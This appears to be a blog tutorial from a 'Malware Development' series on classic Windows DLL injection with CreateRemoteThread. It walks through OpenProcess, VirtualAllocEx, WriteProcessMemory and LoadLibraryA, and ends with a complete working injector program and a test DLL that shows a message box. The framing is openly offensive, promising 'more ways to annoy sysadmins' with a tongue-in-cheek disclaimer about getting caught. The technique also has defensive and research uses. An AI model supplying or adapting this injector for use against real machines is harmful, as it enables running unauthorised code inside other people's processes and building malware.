---
title: "Process Injection: Simple DLL Injection Using CreateRemoteThread"
date: 2025-05-20 12:22:22
author: 1
categories: [Malware Development, Process Injection]
tags: [dll injection, process injection, OpenProcess, VirtualAllocEx, CreateRemoteThread, WriteProcessMemory, LoadLibraryA]     # TAG names should always be lowercase
---

Welcome to the first post on Malware Development. In this post, we will go through the process injection. There are different ways to perform process injection; for this post, we will specifically focus on simple DLL injection using **CreateRemoteThread**.

---

## Prerequisites

Before starting with malware development, there are some basic prerequisites:

- Basic understanding of processes and threads
- Some programming skills in C/C++
- Some experience with Win32 APIs or the ability to read documentation
- A Brain. Seriously, don’t skip this one.
    

---

## Creating a Custom DLL

Before injecting, let's create a basic DLL that will display a MessageBox using [MessageBoxA WinAPI](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa). (Please, resist the urge to use msfvenom. Have some self-respect.)

> **Note:** Most Windows functions have names ending in A, Ex, or W for the same function. For example, MessageBoxA, MessageBoxW, MessageBoxEx. The differences are:
{: .prompt-info }

|Suffix|Meaning|Character Encoding / Purpose|Example|Key Difference|
|---|---|---|---|---|
|A|ANSI|Uses ANSI (single-byte) encoding|MessageBoxA|Accepts/returns ANSI strings for legacy compatibility|
|W|Wide|Uses Unicode (wide-char) encoding|MessageBoxW|Accepts/returns Unicode (UTF-16) strings for modern Windows|
|Ex|Extended|Extended functionality|MessageBoxEx|Adds extra parameters or features beyond the base version|

For this article, we will use **MessageBoxA**. Here is the example code for MessageBox which will display a "DLL Injected" message with the title "Success":

```cpp
MessageBoxA(NULL, "DLL Injected", "Success", MB_OK);
```

You can follow the tutorial from [Microsoft](https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain) to create a DLL file. When the DLL is injected into a process, the `DllMain` function is called with `DLL_PROCESS_ATTACH` as a parameter. When this function is called, it will execute our MessageBoxA WinAPI.

```cpp
#include <windows.h>

BOOL WINAPI DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
	if (reason == DLL_PROCESS_ATTACH) {
		MessageBoxA(NULL, "DLL Injected", "Success", MB_OK);
	}
	return TRUE;
}
```

Compile this DLL using g++  (Because Not Everyone Uses Visual Studio):

```bash
g++ -shared -o inject.dll inject.cpp -luser32
```

---

## Important Win32 APIs for DLL Injection

Before writing the code that will inject the DLL, let's learn about some important Win32 APIs.

### 1. OpenProcess

**OpenProcess** is a Win32 API that allows you to open an existing local process and return a handle to it (a handle allows you to use/modify the process, but it's not the process itself).

**Syntax:**

```cpp
HANDLE OpenProcess(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);
```

OpenProcess takes three parameters: desired access to the process, whether the child should inherit the handle, and the process ID.

There are different `DesiredAccess` values for OpenProcess like `PROCESS_CREATE_THREAD`, `PROCESS_VM_READ`, `PROCESS_VM_WRITE`, etc. For injecting a DLL into a process, we need `PROCESS_CREATE_THREAD`, `PROCESS_VM_OPERATION`, and `PROCESS_VM_WRITE` access.

> **Note:** When you request certain access to a process, Windows will check the process's security descriptor to decide if you are allowed those permissions. If you have **SeDebugPrivilege**, all checks are bypassed and you get whatever permissions you request.
{: .prompt-tip }

**Sample code:**

```cpp
HANDLE hProcess = OpenProcess(
	PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
	FALSE,
	PID
);
```

---

### 2. VirtualAllocEx

**VirtualAllocEx** is a Win32 API that asks the operating system to allocate a chunk of memory in the virtual address space of a specified process (not limited to the current process only). To allocate space in a different process, you need a process handle with appropriate permissions (like `PROCESS_VM_OPERATION`). Using the handle from OpenProcess above, we already have the required permissions.

**Syntax:**

```cpp
LPVOID VirtualAllocEx( HANDLE hProcess, 
		LPVOID lpAddress, 
		SIZE_T dwSize, 
		DWORD flAllocationType, 
		DWORD flProtect 
	);
```

Parameters:

- **hProcess**: Handle to the process
    
- **lpAddress**: Desired starting address for allocation (NULL to let the system choose)
    
- **dwSize**: Size of the memory to allocate
    
- **flAllocationType**: Type of memory allocation (`MEM_COMMIT`, `MEM_RESERVE`, etc.)
    
- **flProtect**: Memory protection for the region (`PAGE_READWRITE`, `PAGE_EXECUTE`, etc.)
    

We need to allocate usable physical memory in the target process and allow the injector to write the DLL path, so we will use `MEM_COMMIT` and `PAGE_READWRITE`.

**Sample code:**

```cpp
LPVOID pDllPath = VirtualAllocEx( 
				hProcess, 
				NULL, 
				strlen(dllPath) + 1, 
				MEM_COMMIT, 
				PAGE_READWRITE 
			);
```

---

### 3. WriteProcessMemory

**WriteProcessMemory** is a Windows API function that allows us to write data into the address space of another process.

**Syntax:**

```cpp
BOOL WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
```

Parameters:

- **hProcess**: Handle to the target process (must have `PROCESS_VM_WRITE` and `PROCESS_VM_OPERATION` access rights)
    
- **lpBaseAddress**: Pointer to the starting address in the target process's memory where data will be written
    
- **lpBuffer**: Pointer to the buffer in the calling process that contains the data to be written
    
- **nSize**: Number of bytes to write from the buffer into the target process's memory
    
- **lpNumberOfBytesWritten**: Pointer to a variable that receives the number of bytes actually written (can be NULL)
    

**Sample code:**

```cpp
SIZE_T bytesWritten; 
WriteProcessMemory( 
			hProcess, 
			pDllPath, 
			dllPath, 
			strlen(dllPath) + 1, 
			&bytesWritten );
```

---

### 4. CreateRemoteThread

**CreateRemoteThread** is a Windows API function that allows a process to create a thread in the virtual address space of another process.

**Syntax:**


```cpp
HANDLE CreateRemoteThread(
  HANDLE hProcess,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  SIZE_T dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID lpParameter,
  DWORD dwCreationFlags,
  LPDWORD lpThreadId
);
```
Parameters:

- **hProcess**: Handle to the target process (must have appropriate access rights)
    
- **lpThreadAttributes**: Pointer to security attributes (can be NULL for defaults)
    
- **dwStackSize**: Initial stack size for the new thread (0 for default)
    
- **lpStartAddress**: Address of the function to execute in the remote process
    
- **lpParameter**: Pointer to a variable passed to the thread function (can be a pointer to any data, but only one pointer)
    
- **dwCreationFlags**: Flags controlling thread creation (e.g., `CREATE_SUSPENDED`)
    
- **lpThreadId**: Pointer to a variable that receives the thread identifier
    

#### LoadLibraryA

For our purposes, we have everything except **lpStartAddress**. As we know, lpStartAddress is a function pointer to execute. We want to load a DLL in the process, so we need to execute the `LoadLibraryA` function inside the target process. However, we must provide the address of `LoadLibraryA`.

`LoadLibraryA` is exported by `kernel32.dll` and is typically loaded at the same base address in all processes on Windows (due to system-wide DLL address randomization being limited for system DLLs). By obtaining the address of `LoadLibraryA` in our current process, we can usually (but not always) use the same address in the target process for `lpStartAddress`.

```cpp 
LPVOID pLoadLibrary = (LPVOID)GetProcAddress(
    GetModuleHandle("kernel32.dll"),
    "LoadLibraryA"
);
```

`GetModuleHandle("kernel32.dll")` retrieves a handle to the loaded module "kernel32.dll" in the current process, and `GetProcAddress(..., "LoadLibraryA")` retrieves the address of the function `LoadLibraryA` from that module.

Now, we have the address of `LoadLibraryA`, and we can call CreateRemoteThread:

```cpp
HANDLE hThread = CreateRemoteThread( 
		hProcess, 
		NULL, 
		0, 
		(LPTHREAD_START_ROUTINE)pLoadLibrary, 
		pDllPath, 
		0, 
		NULL 
		);
```
---

## Final Code

Now we have injected our DLL into the given process. Here is the complete source code for `injector.cpp`:

```cpp
#include <windows.h>
#include <stdio.h>

BOOL InjectDLL(DWORD pid, const char* dllPath) {
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        FALSE,
        pid
    );
    if (!hProcess) return FALSE;
    
    LPVOID pDllPath = VirtualAllocEx(
        hProcess,
        NULL,
        strlen(dllPath) + 1,
        MEM_COMMIT,
        PAGE_READWRITE
    );
    if (!pDllPath) return FALSE;

    SIZE_T bytesWritten;
    WriteProcessMemory(
        hProcess,
        pDllPath,
        dllPath,
        strlen(dllPath) + 1,
        &bytesWritten
    );

    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(
        GetModuleHandle("kernel32.dll"),
        "LoadLibraryA"
    );

    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary,
        pDllPath,
        0,
        NULL
    );

    // Cleanup
    WaitForSingleObject(hThread, INFINITE);
    VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: %s <PID> <DLL Path>\n", argv[0]);
        return 1;
    }

    DWORD pid = (DWORD)atoi(argv[1]);
    const char* dllPath = argv[2];

    if (InjectDLL(pid, dllPath)) {
        printf("Injection successful!\n");
    } else {
        printf("Injection failed.\n");
    }

    return 0;
}
```
---
## Final Thoughts

We have just performed classic DLL injection. It’s not stealthy, it’s not subtle, but it works. 

>**Disclaimer:** This is for educational purposes only. If you get caught, you didn’t learn it here.
{: .prompt-danger }
>**Stay tuned for more ways to annoy sysadmins and impress your hacker friends!**
{: .prompt-danger }